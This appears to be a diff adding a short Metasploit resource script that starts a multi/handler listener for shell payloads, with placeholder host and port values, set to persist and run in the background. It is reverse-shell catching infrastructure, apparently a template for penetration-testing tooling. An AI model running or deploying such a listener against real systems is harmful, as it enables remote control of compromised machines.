@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload shell
+set lhost msflhost
+set lport msflport
+set ExitOnSession false
+exploit -j -z
